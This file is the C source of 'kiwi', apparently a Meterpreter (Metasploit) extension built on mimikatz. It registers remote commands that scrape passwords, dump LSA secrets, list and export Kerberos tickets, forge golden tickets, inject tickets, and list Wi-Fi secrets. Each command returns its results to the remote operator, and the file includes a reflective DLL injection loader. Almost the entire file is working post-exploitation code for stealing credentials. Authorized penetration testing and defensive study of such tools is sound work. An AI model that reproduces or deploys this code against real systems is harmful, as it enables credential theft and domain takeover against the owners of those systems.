/*!
 * @file main.c
 * @brief Entry point for the kiwi extension.
 */

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

#include "main.h"
#include "mimikatz_interface.h"

DWORD request_scrape_passwords(Remote *remote, Packet *packet);
DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet);
DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet);
DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet);
DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);
DWORD request_wifi_profile_list(Remote *remote, Packet *packet);

/*! @brief The enabled commands for this extension. */
Command customCommands[] =
{
    COMMAND_REQ("kiwi_scrape_passwords", request_scrape_passwords),
    COMMAND_REQ("kiwi_kerberos_ticket_use", request_kerberos_ticket_use),
    COMMAND_REQ("kiwi_kerberos_golden_ticket_create", request_kerberos_golden_ticket_create),
    COMMAND_REQ("kiwi_kerberos_ticket_purge", request_kerberos_ticket_purge),
    COMMAND_REQ("kiwi_kerberos_ticket_list", request_kerberos_ticket_list),
    COMMAND_REQ("kiwi_lsa_dump_secrets", request_lsa_dump_secrets),
    COMMAND_REQ("kiwi_wifi_profile_list", request_wifi_profile_list),
    COMMAND_TERMINATOR
};

/*!
 * @brief Handler for the lsa dump secrets message.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);

	dprintf("[KIWI LSA] Dumping LSA Secrets");

	result = mimikatz_lsa_dump_secrets(response);

	dprintf("[KIWI LSA] Dumped, transmitting response.");
	packet_transmit_response(result, remote, response);
	dprintf("[KIWI LSA] Done.");

	return ERROR_SUCCESS;
}

/*!
 * @brief Handler for the use kerberos ticket message.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response(packet);
	DWORD result = ERROR_INVALID_PARAMETER;
	Tlv ticketTlv;

	result = packet_get_tlv(packet, TLV_TYPE_KIWI_KERB_TKT_RAW, &ticketTlv);

	if (result == ERROR_SUCCESS)
	{
		dprintf("[KIWI] Ticket size: %u bytes", ticketTlv.header.length);
		result = mimikatz_kerberos_ticket_use(ticketTlv.buffer, ticketTlv.header.length);
	}
	else
	{
		dprintf("[KIWI] Failed to get ticket content");
	}

	packet_transmit_response(result, remote, response);

	return result;
}

/*!
 * @brief Handler for the create golden kerberos ticket message.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet)
{
	DWORD dwResult;
	Packet * response = packet_create_response(packet);
	DWORD dwGroupCount = 0;
	DWORD* pdwGroups = NULL;
	Tlv groupIdTlv;
	char* user = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_USER);
	char* domain = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_DOMAIN);
	char* sid = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_SID);
	char* tgt = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_TGT);
	DWORD userId = packet_get_tlv_value_uint(packet, TLV_TYPE_KIWI_GOLD_USERID);

	if (!user || !domain || !sid || !tgt)
	{
		dwResult = ERROR_INVALID_PARAMETER;
	}
	else
	{
		while (packet_enum_tlv(packet, dwGroupCount, TLV_TYPE_KIWI_GOLD_GROUPID, &groupIdTlv) == ERROR_SUCCESS)
		{
			pdwGroups = (DWORD*)realloc(pdwGroups, sizeof(DWORD) * (dwGroupCount + 1));

			if (!pdwGroups)
			{
				BREAK_WITH_ERROR("Unable to allocate memory for groups", ERROR_OUTOFMEMORY);
			}

			pdwGroups[dwGroupCount++] = htonl(*(UINT*)groupIdTlv.buffer);
		}

		dwResult = mimikatz_kerberos_golden_ticket_create(user, domain, sid, tgt, userId, pdwGroups, dwGroupCount, response);
	}

	packet_transmit_response(dwResult, remote, response);

	return ERROR_SUCCESS;
}

/*!
 * @brief Handler for the list kerberos tickets message.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);
	BOOL bExport = packet_get_tlv_value_bool(packet, TLV_TYPE_KIWI_KERB_EXPORT);

	result = mimikatz_kerberos_ticket_list(bExport, response);

	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*!
 * @brief Handler for the purge current kerberos tickets message.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet)
{
	DWORD result = mimikatz_kerberos_ticket_purge();

	dprintf("[KIWI] Purging kerberos tickets (if present)");

	packet_transmit_empty_response(remote, packet, result);

	return ERROR_SUCCESS;
}

/*!
 * @brief Handler for the password scraping message.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_scrape_passwords(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);
	UINT pwdId = packet_get_tlv_value_uint(packet, TLV_TYPE_KIWI_PWD_ID);

	dprintf("[KIWI] Pwd ID: %u", pwdId);

	result = mimikatz_scrape_passwords(pwdId, response);
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*!
 * @brief Handler for request to list all wifi profiles/secrets.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_wifi_profile_list(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);

	result = mimikatz_wifi_profile_list(response);
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	dprintf("[KIWI] Init server extension - initorclean");
	mimikatz_init_or_clean(TRUE);

	dprintf("[KIWI] Init server extension - register");
	command_register_all(customCommands);

	dprintf("[KIWI] Init server extension - done");

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	mimikatz_init_or_clean(FALSE);
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "kiwi", bufferSize - 1);
	return ERROR_SUCCESS;
}